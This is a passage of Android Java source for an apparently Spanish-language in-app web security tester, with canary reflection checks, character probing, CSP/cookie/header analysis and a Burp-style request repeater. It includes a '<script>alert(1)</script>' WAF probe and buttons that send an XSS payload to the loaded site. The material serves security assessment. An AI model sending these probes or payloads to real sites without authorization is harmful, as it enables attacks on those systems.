                    + "try { var o = JSON.parse(s.textContent); if (" + qField + " in o) { o[" + qField + "] = " + org.json.JSONObject.quote(token) + "; s.textContent = JSON.stringify(o); n++; } } catch(e){} });"
                    + "return n;})()";
            webView.evaluateJavascript(js, value -> {
                int n = 0;
                try { n = Integer.parseInt(unquote(value)); } catch (Exception ignored) { }
                coverageResults.put(key, n > 0 ? "valor insertado en " + n + " bloque(s) JSON" : "campo no encontrado en bloques JSON");
                if (scanRunning) advanceScanForStep(scanCurrentId);
                if (activePanel.equals("OWASP")) renderNow();
            });
        }
        renderNow();
    }

    private void showCanarySection() {
        addPanelText("Envía un identificador único (canario) en un parámetro URL, un formulario, una cabecera o una cookie, y busca dónde aterriza en el HTML/DOM. El canario no ejecuta nada: solo marca el dato.", Color.LTGRAY);
        EditText canaryInput = new EditText(this);
        canaryInput.setSingleLine(true);
        canaryInput.setTextColor(Color.WHITE);
        canaryInput.setHintTextColor(Color.LTGRAY);
        canaryInput.setHint("testxss9988");
        canaryInput.setTextSize(12);
        canaryInput.setPadding(dp(8), dp(6), dp(8), dp(6));
        canaryInput.setBackgroundColor(Color.rgb(43, 48, 58));
        canaryInput.setText(canaryToken);
        canaryInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { canaryToken = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        panelContent.addView(canaryInput, new LinearLayout.LayoutParams(-1, dp(40)));
        addPanelButton("Enviar canario por URL (parámetro q)", v -> sendCanaryViaUrl());
        addPanelButton("Enviar canario por formulario (primer campo, con envío)", v -> sendCanaryViaForm());
        addPanelButton("Enviar canario por User-Agent", v -> sendCanaryViaUa());
        addPanelButton("Enviar canario por Referer", v -> sendCanaryViaReferer());
        addPanelButton("Enviar canario por cookie", v -> sendCanaryViaCookie());
        addPanelButton("Buscar canario en la página actual", v -> { canarySearchTarget = null; findCanary(); });
        if (canaryResults != null) addPanelText(canaryResults, Color.rgb(215, 220, 230));
    }

    private void sendCanaryViaUrl() {
        if (!checkCanary()) return;
        armPendingTest("canary:url", "canary");
        String js = "(function(){var u = new URL(location.href); u.searchParams.set('q', " + org.json.JSONObject.quote(canaryToken.trim()) + "); location.href = u.toString();})()";
        webView.evaluateJavascript(js, null);
        canaryResults = "Canario enviado por URL (q=" + canaryToken.trim() + "). Esperando a que cargue la página…";
        renderNow();
    }

    private void sendCanaryViaForm() {
        if (!checkCanary()) return;
        canaryResults = "Canario enviado por formulario. Esperando a que cargue la página…";
        armPendingTest("canary:form", "canary");
        String js = "(function(){if (!document.forms.length) return 'sin formularios';"
                + "var f = document.forms[0];"
                + "for (var i = 0; i < f.elements.length; i++) { var el = f.elements[i]; if (el.name && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) { el.value = " + org.json.JSONObject.quote(canaryToken.trim()) + "; break; } }"
                + "f.submit(); return 'ok';})()";
        webView.evaluateJavascript(js, value -> {
            if ("sin formularios".equals(unquote(value))) {
                coveragePendingTest = null;
                coveragePendingKind = null;
                canaryResults = "La página no tiene formularios.";
                if (activePanel.equals("OWASP")) renderNow();
            }
        });
        renderNow();
    }

    private void sendCanaryViaUa() {
        if (!checkCanary()) return;
        if (coverageUaBackup == null) coverageUaBackup = webView.getSettings().getUserAgentString();
        webView.getSettings().setUserAgentString(canaryToken.trim());
        armPendingTest("canary:ua", "canary");
        canaryResults = "Canario enviado por User-Agent. Recargando…";
        webView.reload();
        renderNow();
    }

    private void sendCanaryViaReferer() {
        if (!checkCanary()) return;
        String url = webView.getUrl();
        if (url == null) return;
        java.util.HashMap<String, String> headers = new java.util.HashMap<>();
        headers.put("Referer", canaryToken.trim());
        armPendingTest("canary:referer", "canary");
        canaryResults = "Canario enviado por Referer. Cargando…";
        webView.loadUrl(url, headers);
        renderNow();
    }

    private void sendCanaryViaCookie() {
        if (!checkCanary()) return;
        String url = webView.getUrl();
        if (url == null) return;
        android.webkit.CookieManager.getInstance().setCookie(url, "browserdebug_canary=" + Uri.encode(canaryToken.trim()) + "; Path=/");
        android.webkit.CookieManager.getInstance().flush();
        armPendingTest("canary:cookie", "canary");
        canaryResults = "Canario enviado por cookie (browserdebug_canary). Recargando…";
        webView.reload();
        renderNow();
    }

    private void completeCanarySearch(String key) {
        canarySearchTarget = key;
        findCanary();
    }

    private void findCanary() {
        String js = "JSON.stringify((function(){"
                + "var html = document.documentElement.outerHTML;"
                + "var token = " + org.json.JSONObject.quote(canaryToken.trim()) + ";"
                + "var hits = [];"
                + "var idx = 0;"
                + "while ((idx = html.indexOf(token, idx)) >= 0) {"
                + "var before = html.slice(Math.max(0, idx - 150), idx);"
                + "var after = html.slice(idx + token.length, idx + token.length + 80);"
                + "var ctx = 'etiqueta';"
                + "var co = before.lastIndexOf('<!--');"
                + "var cc = before.lastIndexOf('-->');"
                + "if (co > cc) { ctx = 'comentario'; }"
                + "else {"
                + "var lt = before.lastIndexOf('<');"
                + "var gt = before.lastIndexOf('>');"
                + "if (lt > gt) { ctx = 'atributo'; }"
                + "else {"
                + "var tags = before.match(/<([a-zA-Z][a-zA-Z0-9]*)\\b[^>]*>/g);"
                + "var last = tags ? tags[tags.length - 1] : '';"
                + "if (/^<script/i.test(last)) ctx = 'script';"
                + "else if (/^<style/i.test(last)) ctx = 'css';"
                + "}"
                + "}"
                + "hits.push({ctx: ctx, snippet: before.slice(-70) + token + after.slice(0, 50)});"
                + "idx += token.length;"
                + "if (hits.length >= 10) break;"
                + "}"
                + "return {count: hits.length, hits: hits};"
                + "})())";
        webView.evaluateJavascript(js, value -> handleCanaryResult(unquote(value)));
    }

    private void handleCanaryResult(String json) {
        String result;
        try {
            org.json.JSONObject data = new org.json.JSONObject(json);
            int count = data.optInt("count");
            org.json.JSONArray hits = data.optJSONArray("hits");
            if (count == 0) {
                result = "Canario «" + canaryToken.trim() + "» no encontrado en la página: el dato no se refleja en el HTML ni en el DOM.";
            } else {
                java.util.LinkedHashMap<String, Integer> byCtx = new java.util.LinkedHashMap<>();
                StringBuilder out = new StringBuilder();
                out.append("Canario encontrado ").append(count).append(count == 1 ? " vez" : " veces").append(": ");
                if (hits != null) {
                    for (int i = 0; i < hits.length(); i++) {
                        org.json.JSONObject hit = hits.optJSONObject(i);
                        if (hit == null) continue;
                        String ctx = hit.optString("ctx", "etiqueta");
                        Integer n = byCtx.get(ctx);
                        byCtx.put(ctx, (n == null ? 0 : n) + 1);
                        Integer total = canaryContextCounts.get(ctx);
                        canaryContextCounts.put(ctx, (total == null ? 0 : total) + 1);
                    }
                }
                if (canarySearchTarget != null && !byCtx.isEmpty()) coverageContexts.put(canarySearchTarget, byCtx.keySet().iterator().next());
                boolean first = true;
                for (java.util.Map.Entry<String, Integer> e : byCtx.entrySet()) {
                    if (!first) out.append(", ");
                    out.append(e.getValue()).append(" en ").append(contextName(e.getKey()));
                    first = false;
                }
                out.append(".\n");
                if (hits != null) {
                    for (int i = 0; i < Math.min(hits.length(), 5); i++) {
                        org.json.JSONObject hit = hits.optJSONObject(i);
                        if (hit != null) out.append("• [").append(contextName(hit.optString("ctx", "etiqueta"))).append("] …").append(hit.optString("snippet")).append("…\n");
                    }
                }
                result = out.toString();
            }
        } catch (Exception e) {
            result = "No se pudo buscar el canario: " + json;
        }
        String target = canarySearchTarget;
        canarySearchTarget = null;
        if (target == null) canaryResults = result;
        else coverageResults.put(target, result.split("\n")[0]);
        if (target != null && coveragePendingPageKey != null && pageCoverageKey() != null && !pageCoverageKey().equals(coveragePendingPageKey)) clearCoverageState();
        coveragePendingPageKey = null;
        if (scanRunning && target != null) {
            if (result.startsWith("Canario encontrado")) { scanReflected++; addScanFinding("[MEDIO] Dato reflejado en " + target); }
            advanceScanForStep(scanCurrentId);
        }
        if (activePanel.equals("OWASP")) renderNow();
    }

    private static final String PROBE_CHARS = "\"'<>()/;:";

    private void showProbeSection() {
        addPanelText("Envía el canario junto con caracteres críticos (" + PROBE_CHARS + ") y comprueba cuáles regresan intactos, cuáles se convierten en entidades HTML (ej. < → &lt;) y cuáles desaparecen. El análisis se hace sobre el HTML serializado del DOM.", Color.LTGRAY);
        addPanelButton("Sondear caracteres por URL (parámetro q)", v -> sendProbeViaUrl());
        addPanelButton("Analizar caracteres ya presentes en la página", v -> analyzeProbeChars(null));
        if (probeResults != null) addPanelText(probeResults, Color.rgb(215, 220, 230));
    }

    private void sendProbeViaUrl() {
        if (!checkCanary()) return;
        armPendingTest("probe:url", "probe");
        String js = "(function(){var u = new URL(location.href); u.searchParams.set('q', " + org.json.JSONObject.quote(canaryToken.trim() + PROBE_CHARS) + "); location.href = u.toString();})()";
        webView.evaluateJavascript(js, null);
        probeResults = "Sonda enviada (canario + " + PROBE_CHARS + "). Esperando a que cargue la página…";
        renderNow();
    }

    private void analyzeProbeChars(String pendingKey) {
        String js = "JSON.stringify((function(){"
                + "var html = document.documentElement.outerHTML;"
                + "var token = " + org.json.JSONObject.quote(canaryToken.trim()) + ";"
                + "var idx = html.indexOf(token);"
                + "if (idx < 0) return {found: false};"
                + "return {found: true, after: html.slice(idx + token.length, idx + token.length + 40)};"
                + "})())";
        webView.evaluateJavascript(js, value -> handleProbeResult(unquote(value), pendingKey));
    }

    private void handleProbeResult(String json, String pendingKey) {
        String result;
        try {
            org.json.JSONObject data = new org.json.JSONObject(json);
            if (!data.optBoolean("found")) {
                result = "La sonda no se encontró en la página: el canario no se refleja, así que no se puede saber cómo se tratan los caracteres.";
            } else {
                String after = data.optString("after", "");
                StringBuilder out = new StringBuilder("Sonda encontrada. Caracteres tras el canario:\n");
                String[] chars = {"\"", "'", "<", ">", "(", ")", "/", ";", ":"};
                String[] entities = {"&quot;", "&#39;", "&lt;", "&gt;", "&#40;", "&#41;", "&#47;", "&#59;", "&#58;"};
                for (int i = 0; i < chars.length; i++) {
                    String c = chars[i];
                    String status;
                    if (after.contains(c)) status = "intacto";
                    else if (after.contains(entities[i]) || after.contains("&#" + (int) c.charAt(0) + ";")) status = "convertido a entidad (" + entities[i] + ")";
                    else status = "eliminado o transformado";
                    out.append("• '").append(c).append("': ").append(status).append("\n");
                }
                out.append("Fragmento tal cual: ").append(after);
                result = out.toString();
            }
        } catch (Exception e) {
            result = "No se pudo analizar la sonda: " + json;
        }
        probeResults = result;
        if (pendingKey != null) coverageResults.put(pendingKey, result.split("\n")[0]);
        coveragePendingPageKey = null;
        if (scanRunning) {
            if (result.contains(": intacto")) addScanFinding("[MEDIO] Caracteres críticos regresan intactos (ver Caracteres)");
            advanceScanForStep(scanCurrentId);
        }
        if (activePanel.equals("OWASP")) renderNow();
    }

    private void showWafSection() {
        addPanelText("Envía <script> en un parámetro URL. Si la respuesta es 403 Forbidden o la conexión se reinicia, hay un WAF o una regla de bloqueo activo.", Color.LTGRAY);
        addPanelButton(wafChecking ? "Probando WAF…" : "Probar WAF con <script> en la URL", v -> testWaf());
        if (lastHttpErrorSeq > 0) addPanelText("Último error HTTP en el marco principal: " + lastHttpErrorCode + " en " + shortUrl(lastHttpErrorUrl), Color.rgb(215, 220, 230));
        if (lastNetworkError != null) addPanelText("Último error de red en el marco principal: " + lastNetworkError, Color.rgb(215, 220, 230));
        if (wafResults != null) addPanelText(wafResults, Color.rgb(215, 220, 230));
    }

    private void testWaf() {
        if (wafChecking) return;
        wafChecking = true;
        wafErrSeq = lastHttpErrorSeq;
        wafNetSeq = lastNetworkErrorSeq;
        armPendingTest("waf:script", "waf");
        wafResults = "Probando <script> en la URL…";
        renderNow();
        String js = "(function(){var u = new URL(location.href); u.searchParams.set('q', '<script>alert(1)</script>'); location.href = u.toString();})()";
        webView.evaluateJavascript(js, null);
        webView.postDelayed(() -> {
            if (wafChecking && coveragePendingTest != null && "waf".equals(coveragePendingKind)) {
                String pending = coveragePendingTest;
                coveragePendingTest = null;
                coveragePendingKind = null;
                completeWafCheck(pending);
            }
        }, 4000);
    }

    private void completeWafCheck(String key) {
        if (!wafChecking) return;
        wafChecking = false;
        String result;
        if (lastHttpErrorSeq > wafErrSeq && lastHttpErrorCode == 403) result = "WAF o bloqueo activo: la petición devolvió 403 Forbidden al enviar <script>.";
        else if (lastHttpErrorSeq > wafErrSeq && lastHttpErrorCode >= 400) result = "La petición devolvió HTTP " + lastHttpErrorCode + " al enviar <script> (no es 403, pero la aplicación rechazó la petición).";
        else if (lastNetworkErrorSeq > wafNetSeq) result = "Conexión interrumpida al enviar <script> (" + lastNetworkError + "): posible WAF o bloqueo a nivel de red.";
        else result = "Sin bloqueo detectado: la página cargó con <script> en la URL (sin 403 ni corte de conexión). Eso no prueba que no haya WAF: puede filtrar sin bloquear.";
        wafResults = result;
        coverageResults.put(key, result);
        coveragePendingPageKey = null;
        if (scanRunning) {
            addScanFinding((lastHttpErrorSeq > wafErrSeq && lastHttpErrorCode == 403) ? "[INFO] WAF activo (403 al enviar <script>)" : "[INFO] Sin bloqueo WAF detectado");
            advanceScanForStep(scanCurrentId);
        }
        if (activePanel.equals("OWASP")) renderNow();
    }

    private void showCspSection() {
        addPanelText("Analiza las cabeceras de respuesta de la URL actual (petición propia de la app) y revisa la política Content-Security-Policy y sus configuraciones débiles.", Color.LTGRAY);
        addPanelButton(cspAnalyzing ? "Analizando cabeceras…" : "Analizar cabeceras (CSP)", v -> analyzeHeaders());
        if (cspResults != null) addPanelText(cspResults, Color.rgb(215, 220, 230));
    }

    private void showCookieSection() {
        addPanelText("Revisa las cookies que envía el servidor (Set-Cookie) y si tienen HttpOnly. Sin HttpOnly, un XSS exitoso puede robar la sesión con document.cookie. Las cookies que solo existen en document.cookie fueron creadas por JavaScript y nunca tienen HttpOnly.", Color.LTGRAY);
        addPanelButton(cspAnalyzing ? "Analizando cabeceras…" : "Revisar cookies del servidor", v -> analyzeHeaders());
        if (cookieResults != null) addPanelText(cookieResults, Color.rgb(215, 220, 230));
    }

    private void analyzeHeaders() {
        String url = webView.getUrl();
        if (url == null) { Toast.makeText(this, "Carga una página primero", Toast.LENGTH_SHORT).show(); return; }
        if (cspAnalyzing) return;
        cspAnalyzing = true;
        cspResults = "Pidiendo cabeceras de " + shortUrl(url) + "…";
        cookieResults = null;
        renderNow();
        final String target = url;
        new Thread(() -> {
            String csp = null;
            String cspReportOnly = null;
            String hsts = null, xfo = null, xcto = null, referrer = null, permissions = null, server = null, poweredBy = null;
            java.util.ArrayList<String> setCookies = new java.util.ArrayList<>();
            String error = null;
            java.net.HttpURLConnection conn = null;
            try {
                conn = (java.net.HttpURLConnection) new java.net.URL(target).openConnection();
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("User-Agent", webView.getSettings().getUserAgentString());
                conn.setInstanceFollowRedirects(true);
                conn.connect();
                java.util.Map<String, java.util.List<String>> headers = conn.getHeaderFields();
                if (headers != null) {
                    for (java.util.Map.Entry<String, java.util.List<String>> e : headers.entrySet()) {
                        if (e.getKey() == null || e.getValue().isEmpty()) continue;
                        String k = e.getKey().toLowerCase(java.util.Locale.ROOT);
                        if (k.equals("content-security-policy")) csp = e.getValue().get(0);
                        else if (k.equals("content-security-policy-report-only")) cspReportOnly = e.getValue().get(0);
                        else if (k.equals("set-cookie")) setCookies.addAll(e.getValue());
                        else if (k.equals("strict-transport-security")) hsts = e.getValue().get(0);
                        else if (k.equals("x-frame-options")) xfo = e.getValue().get(0);
                        else if (k.equals("x-content-type-options")) xcto = e.getValue().get(0);
                        else if (k.equals("referrer-policy")) referrer = e.getValue().get(0);
                        else if (k.equals("permissions-policy")) permissions = e.getValue().get(0);
                        else if (k.equals("server")) server = e.getValue().get(0);
                        else if (k.equals("x-powered-by")) poweredBy = e.getValue().get(0);
                    }
                }
                try { java.io.InputStream in = conn.getInputStream(); byte[] b = new byte[4096]; while (in.read(b) != -1) { } in.close(); } catch (Exception ignored) { }
            } catch (Exception e) {
                error = e.getMessage();
            } finally {
                if (conn != null) conn.disconnect();
            }
            final String cspFinal = csp;
            final String cspRoFinal = cspReportOnly;
            final java.util.ArrayList<String> cookiesFinal = setCookies;
            final String errorFinal = error;
            final String securityFinal = buildSecurityHeadersResult(hsts, xfo, xcto, referrer, permissions, server, poweredBy, error);
            runOnUiThread(() -> {
                cspAnalyzing = false;
                cspResults = buildCspResult(cspFinal, cspRoFinal, errorFinal);
                cookieResults = buildCookieResult(cookiesFinal, errorFinal);
                securityHeadersResults = securityFinal;
                if (scanRunning) {
                    if (cspResults != null && (cspResults.contains("Sin CSP") || cspResults.contains("unsafe-inline") || cspResults.contains("unsafe-eval"))) addScanFinding("[MEDIO] CSP débil o ausente (ver sección CSP)");
                    if (cookieResults != null && cookieResults.contains("HttpOnly: NO")) addScanFinding("[MEDIO] Hay cookies sin HttpOnly (ver sección Cookies)");
                    if (securityFinal != null && securityFinal.contains("Strict-Transport-Security: ausente")) addScanFinding("[MEDIO] Falta Strict-Transport-Security");
                    if (securityFinal != null && securityFinal.contains("X-Frame-Options: ausente")) addScanFinding("[MEDIO] Falta X-Frame-Options (clickjacking)");
                    if (securityFinal != null && securityFinal.contains("X-Content-Type-Options: ausente")) addScanFinding("[MEDIO] Falta X-Content-Type-Options");
                    advanceScanForStep(scanCurrentId);
                }
                if (activePanel.equals("OWASP")) renderNow();
            });
        }).start();
    }

    private String buildSecurityHeadersResult(String hsts, String xfo, String xcto, String referrer, String permissions, String server, String poweredBy, String error) {
        if (error != null) return "No se pudieron leer las cabeceras: " + error;
        StringBuilder out = new StringBuilder("Cabeceras de seguridad:\n");
        out.append("• Strict-Transport-Security: ").append(hsts == null ? "ausente" : hsts).append("\n");
        out.append("• X-Frame-Options: ").append(xfo == null ? "ausente" : xfo).append("\n");
        out.append("• X-Content-Type-Options: ").append(xcto == null ? "ausente" : xcto).append("\n");
        out.append("• Referrer-Policy: ").append(referrer == null ? "ausente" : referrer).append("\n");
        out.append("• Permissions-Policy: ").append(permissions == null ? "ausente" : permissions).append("\n");
        out.append("• Server: ").append(server == null ? "no declarado" : server).append("\n");
        out.append("• X-Powered-By: ").append(poweredBy == null ? "no declarado" : poweredBy);
        return out.toString();
    }

    private String buildCspResult(String csp, String cspReportOnly, String error) {
        if (error != null) return "No se pudieron leer las cabeceras: " + error;
        StringBuilder out = new StringBuilder();
        if (csp == null) {
            out.append("Sin CSP: la página no envía Content-Security-Policy. Cualquier script en línea o eval() no está restringido por CSP.");
        } else {
            out.append("CSP presente:\n").append(csp).append("\n");
            java.util.ArrayList<String> weak = new java.util.ArrayList<>();
            String lower = csp.toLowerCase(java.util.Locale.ROOT);
            if (lower.contains("unsafe-inline")) weak.add("unsafe-inline (permite scripts y estilos en línea)");
            if (lower.contains("unsafe-eval")) weak.add("unsafe-eval (permite eval() y Function())");
            if (lower.contains("data:") && (lower.contains("script-src") || lower.contains("default-src"))) weak.add("data: en script-src/default-src (permite scripts en data:)");
            if (lower.contains("script-src *") || lower.contains("script-src 'self' *") || lower.contains("default-src *")) weak.add("comodín * en script-src/default-src");
            if (!lower.contains("script-src") && !lower.contains("default-src")) weak.add("sin script-src ni default-src (no restringe scripts)");
            if (weak.isEmpty()) out.append("Sin configuraciones débiles evidentes (sin unsafe-inline, unsafe-eval ni comodines).");
            else { out.append("Configuraciones débiles:\n"); for (String w : weak) out.append("• ").append(w).append("\n"); }
        }
        if (cspReportOnly != null) out.append("\nHay además una CSP en modo report-only (no se aplica, solo reporta): ").append(cspReportOnly);
        return out.toString();
    }

    private String buildCookieResult(java.util.ArrayList<String> setCookies, String error) {
        if (error != null) return "No se pudieron leer las cabeceras: " + error;
        if (setCookies.isEmpty()) return "El servidor no envió cookies Set-Cookie en esta respuesta. Las cookies visibles en document.cookie (si las hay) fueron creadas por JavaScript y no pueden tener HttpOnly.";
        StringBuilder out = new StringBuilder();
        int withHttpOnly = 0;
        for (String sc : setCookies) {
            String[] parts = sc.split(";");
            String name = parts.length > 0 ? parts[0].trim() : sc;
            String lower = sc.toLowerCase(java.util.Locale.ROOT);
            boolean httpOnly = lower.contains("httponly");
            boolean secure = lower.contains("secure");
            String sameSite = lower.contains("samesite=strict") ? "Strict" : lower.contains("samesite=lax") ? "Lax" : lower.contains("samesite=none") ? "None" : "sin SameSite";
            if (httpOnly) withHttpOnly++;
            out.append("• ").append(name)
                    .append("  ·  HttpOnly: ").append(httpOnly ? "SÍ" : "NO")
                    .append("  ·  Secure: ").append(secure ? "SÍ" : "NO")
                    .append("  ·  SameSite: ").append(sameSite).append("\n");
        }
        out.append(withHttpOnly).append("/").append(setCookies.size()).append(" cookies con HttpOnly. ");
        if (withHttpOnly < setCookies.size()) out.append("Las que no lo tienen pueden ser robadas con document.cookie si hay un XSS exitoso.");
        else out.append("Todas tienen HttpOnly: document.cookie no las expone.");
        return out.toString();
    }

    private void analyzePageSinks() {
        String js = "JSON.stringify((function(){"
                + "var text = '';"
                + "for (var i = 0; i < document.scripts.length; i++) text += document.scripts[i].textContent + '\\n';"
                + "var sinks = ['innerHTML','outerHTML','document.write','document.writeln','eval(','Function(','insertAdjacentHTML','.html(','dangerouslySetInnerHTML','v-html'];"
                + "var out = {};"
                + "sinks.forEach(function(s){ var n = 0, idx = 0; while ((idx = text.indexOf(s, idx)) >= 0) { n++; idx += s.length; } if (n > 0) out[s] = n; });"
                + "return out;"
                + "})())";
        webView.evaluateJavascript(js, value -> {
            try {
                org.json.JSONObject data = new org.json.JSONObject(unquote(value));
                if (data.length() == 0) pageSinkResults = "Sumideros en los scripts de la página: ninguno detectado.";
                else {
                    StringBuilder out = new StringBuilder("Sumideros en los scripts de la página: ");
                    java.util.Iterator<String> keys = data.keys();
                    boolean first = true;
                    while (keys.hasNext()) { String k = keys.next(); if (!first) out.append(", "); out.append(k).append(" ×").append(data.optInt(k)); first = false; }
                    pageSinkResults = out.toString();
                }
            } catch (Exception e) {
                pageSinkResults = "No se pudieron analizar los scripts de la página.";
            }
            if (activePanel.equals("OWASP")) renderNow();
        });
    }

    // Repetidor y Decodificador estilo Burp (v1.9). El Repetidor reenvía
    // una petición editada (método, URL, cabeceras y cuerpo) directo desde
    // el teléfono, con las cookies de la sesión del WebView y su
    // User-Agent salvo que se cambien en las cabeceras. El Decodificador
    // convierte entre Base64, URL, entidades HTML y hexadecimal, y su
    // resultado se puede copiar al cuerpo del Repetidor.
    private EditText panelEditText(String text, String hint, int heightDp) {
        EditText input = new EditText(this);
        input.setSingleLine(false);
        input.setTextColor(Color.WHITE);
        input.setHintTextColor(Color.LTGRAY);
        input.setHint(hint);
        input.setTextSize(12);
        input.setPadding(dp(8), dp(6), dp(8), dp(6));
        input.setBackgroundColor(Color.rgb(43, 48, 58));
        input.setText(text == null ? "" : text);
        panelContent.addView(input, new LinearLayout.LayoutParams(-1, dp(heightDp)));
        return input;
    }

    private void showRepeaterPanel() {
        addPanelText("Repetidor · estilo Burp", Color.rgb(105, 205, 255));
        addPanelText("Edita una petición y reenvíala. Sale directa desde el teléfono, con las cookies de la sesión del WebView y su User-Agent, salvo que los cambies en las cabeceras.", Color.LTGRAY);
        addPanelButton(repeaterView.equals("rep") ? "● Repetidor" : "Repetidor", v -> { repeaterView = "rep"; renderNow(); });
        addPanelButton(repeaterView.equals("int") ? "● Intruso" : "Intruso", v -> { repeaterView = "int"; renderNow(); });
        if (repeaterView.equals("int")) { showIntruderPanel(); return; }
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        EditText methodInput = new EditText(this);
        methodInput.setSingleLine(true);
        methodInput.setTextColor(Color.WHITE);
        methodInput.setHintTextColor(Color.LTGRAY);
        methodInput.setHint("GET");
        methodInput.setTextSize(12);
        methodInput.setPadding(dp(8), dp(6), dp(8), dp(6));
        methodInput.setBackgroundColor(Color.rgb(43, 48, 58));
        methodInput.setText(repeaterMethod);
        methodInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { repeaterMethod = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        EditText urlInput = new EditText(this);
        urlInput.setSingleLine(true);
        urlInput.setTextColor(Color.WHITE);
        urlInput.setHintTextColor(Color.LTGRAY);
        urlInput.setHint("https://…");
        urlInput.setTextSize(12);
        urlInput.setPadding(dp(8), dp(6), dp(8), dp(6));
        urlInput.setBackgroundColor(Color.rgb(43, 48, 58));
        urlInput.setText(repeaterUrl);
        urlInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { repeaterUrl = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        row.addView(methodInput, new LinearLayout.LayoutParams(dp(78), dp(40)));
        row.addView(urlInput, new LinearLayout.LayoutParams(0, dp(40), 1));
        panelContent.addView(row, new LinearLayout.LayoutParams(-1, -2));
        addPanelText("Parámetros (se añaden a la URL al enviar; se llenan solos al tocar una petición del registro)", Color.WHITE);
        for (int i = 0; i < repeaterParams.size(); i++) {
            final int idx = i;
            String[] p = repeaterParams.get(i);
            LinearLayout prow = new LinearLayout(this);
            prow.setOrientation(LinearLayout.HORIZONTAL);
            EditText nameInput = paramEditText(p[0], "nombre");
            nameInput.addTextChangedListener(new android.text.TextWatcher() {
                public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
                public void onTextChanged(CharSequence s, int st, int before, int count) { repeaterParams.get(idx)[0] = s.toString(); }
                public void afterTextChanged(android.text.Editable e) { }
            });
            EditText valueInput = paramEditText(p[1], "valor");
            valueInput.addTextChangedListener(new android.text.TextWatcher() {
                public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
                public void onTextChanged(CharSequence s, int st, int before, int count) { repeaterParams.get(idx)[1] = s.toString(); }
                public void afterTextChanged(android.text.Editable e) { }
            });
            Button del = new Button(this);
            del.setText("✕");
            del.setTextColor(Color.WHITE);
            del.setTextSize(12);
            del.setPadding(dp(4), dp(4), dp(4), dp(4));
            del.setBackgroundColor(Color.rgb(43, 48, 58));
            del.setOnClickListener(v -> { repeaterParams.remove(idx); renderNow(); });
            prow.addView(nameInput, new LinearLayout.LayoutParams(0, dp(40), 1));
            prow.addView(valueInput, new LinearLayout.LayoutParams(0, dp(40), 1));
            prow.addView(del, new LinearLayout.LayoutParams(dp(40), dp(40)));
            panelContent.addView(prow, new LinearLayout.LayoutParams(-1, -2));
        }
        addPanelButton("Añadir parámetro", v -> { repeaterParams.add(new String[]{"", ""}); renderNow(); });
        addPanelButton("Cargar parámetros de la URL", v -> loadParamsFromUrl());
        addPanelButton("Ejecutar GET con estos parámetros", v -> { repeaterMethod = "GET"; sendRepeaterRequest(); });
        addPanelText("Cabeceras (una por línea, Nombre: valor)", Color.WHITE);
        EditText headersInput = panelEditText(repeaterHeaders, "Content-Type: application/json", 72);
        headersInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { repeaterHeaders = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        addPanelText("Cuerpo", Color.WHITE);
        EditText bodyInput = panelEditText(repeaterBody, "Cuerpo de la petición (POST, PUT, PATCH…)", 72);
        bodyInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { repeaterBody = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        addPanelButton(repeaterSending ? "Enviando…" : "Enviar petición", v -> sendRepeaterRequest());
        addPanelButton("Probar con el canario (parámetro q)", v -> repeaterTestWith(canaryToken.trim(), false));
        addPanelButton("Probar con el payload XSS actual (parámetro q)", v -> repeaterTestWith(xssPayload.trim(), false));
        addPanelButton("Enviar el payload XSS actual como cuerpo", v -> repeaterTestWith(xssPayload.trim(), true));
        if (repeaterResult != null) addPanelText(repeaterResult, Color.rgb(215, 220, 230));
        addPanelText("Peticiones recientes (registro de red) — toca una para ejecutarla en el Repetidor con sus parámetros", Color.WHITE);
        java.util.ArrayList<String[]> recent;
        synchronized (repeaterRecent) { recent = new java.util.ArrayList<>(repeaterRecent); }
        if (recent.isEmpty()) addPanelText("Aún no hay peticiones registradas. Carga una página y aparecerán aquí.", Color.LTGRAY);
        else {
            int start = Math.max(0, recent.size() - 8);
            for (int i = recent.size() - 1; i >= start; i--) {
                final String[] req = recent.get(i);
                addPanelButton(req[0] + "  " + shortUrl(req[1]), v -> { loadRecentRequest(req[0], req[1]); sendRepeaterRequest(); });
            }
        }
        addPanelText("Decodificador", Color.WHITE);
        addPanelText("Base64, URL, entidades HTML y hexadecimal. Codifica o decodifica el texto de abajo.", Color.LTGRAY);
        EditText decoderInputView = panelEditText(decoderInput, "Texto a codificar o decodificar", 72);
        decoderInputView.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { decoderInput = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        addPanelButton("Base64: codificar", v -> runDecoder("b64e"));
        addPanelButton("Base64: decodificar", v -> runDecoder("b64d"));
        addPanelButton("URL: codificar", v -> runDecoder("urle"));
        addPanelButton("URL: decodificar", v -> runDecoder("urld"));
        addPanelButton("HTML: codificar", v -> runDecoder("htmle"));
        addPanelButton("HTML: decodificar", v -> runDecoder("htmld"));
        addPanelButton("Hex: codificar", v -> runDecoder("hexe"));
        addPanelButton("Hex: decodificar", v -> runDecoder("hexd"));
        if (decoderOutput != null) addPanelText(decoderOutput, Color.rgb(215, 220, 230));
